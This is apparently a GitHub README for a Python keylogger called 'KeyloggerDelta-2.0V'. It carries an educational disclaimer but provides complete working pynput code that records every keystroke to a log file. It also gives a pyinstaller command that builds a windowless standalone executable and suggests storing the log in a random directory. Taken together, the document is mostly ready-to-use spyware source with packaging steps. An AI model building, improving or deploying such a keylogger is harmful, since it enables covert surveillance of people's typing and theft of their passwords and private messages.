<center><img align="center" src="https://i.ibb.co/kmwkqvg/Key-Logg-PNG.png" alt="KeyLoggPNG" border="0"> </center>

# KeyloggerDelta-2.0V
This is KeyloggerDelta-2.0V. By Python Code with proper comments and an ethical focus. Open Source - MIT License - Contributions and Ask are welcome to improve its functionality or add new features. (^^) / ♡ -XamRyo-

# Ethical and Open-Source:

This repository contains a simple keylogger implemented in Python for **educational purposes** only. It is intended to demonstrate how keylogging works and should be used responsibly. Unauthorized use of this software may violate privacy laws and is strictly prohibited.

## Features
- Captures and logs keypresses.
- Saves keystrokes to a `log.txt` file.
- Stops logging when the `ESC` key is pressed.
- By default, `log.txt` is stored in the same directory where the script is executed. 
- Optionally, the file can be saved to a specific directory or a random location (requires modification).

## Code
```bash
from pynput.keyboard import Key, Listener

# List to store pressed keys
keys = []

def on_press(key):
    """Handles key press events."""
    keys.append(key)
    write_to_log(keys)

def write_to_log(keys):
    """Converts key events to string and writes to a log file."""
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")  # Remove quotes from key string
            logfile.write(key)

def on_release(key):
    """Stops listener when 'Escape' key is pressed."""
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```
## Requirements
- Python 3.13.1 or any V2>
- Libraries:
  - [pynput](https://pypi.org/project/pynput/): For capturing keyboard input.
  - [pyinstaller](https://pypi.org/project/pyinstaller/): For converting Python scripts into standalone executables.

## Installation
1. Clone this repository:
    ```bash
    git clone https://github.com/<your-username>/ethical-keylogger-python.git
    cd ethical-keylogger-python
    ```

2. Install the required Python packages:
    ```bash
    python -m pip install –upgrade pip.
    pip install pynput
    pip install pyinstaller
    ```

3. Run the script:
    ```bash
    python KeyloggerDelta-2.0V.py
    ```

## Create Executable
Convert the script into an executable file:
```bash
pyinstaller --clean --onefile --windowed .\KeyloggerDelta-2.0V.py
```

## Output Details (NOT OBLIGATORY):
- The script creates a file named `log.txt`, which stores all the captured keystrokes.
- **Default Location**: The `log.txt` file will be created in the same directory as the script or executable or idk your PC XD.
- **Custom/Random Location**: You can modify the script to save the `log.txt` file to a specific directory or generate a random location:
    - **Specific Directory**:
      Replace the `log.txt` path in the script with the desired directory, e.g.:
      ```python
      with open('C:/logs/log.txt', 'w') as logfile:
      ```
    - **Random Directory**:
      Use Python's `os` and `random` libraries to dynamically create a random directory. Example:
      ```python
      import os
      import random
      random_dir = f"C:/temp/logs-{random.randint(1000, 9999)}/"
      os.makedirs(random_dir, exist_ok=True)
      with open(f"{random_dir}log.txt", 'w') as logfile:
      ```
      This is NOT NECESSARY...

## DISCLAIMER AND LICENCE
This project is for ethical use only. The Dev-XamRyo are not responsible for any misuse. Ensure you have explicit permission to log keystrokes on any system where this tool is used ^-^

## Licence
This project is licensed under the MIT License. Ask and support repository :)
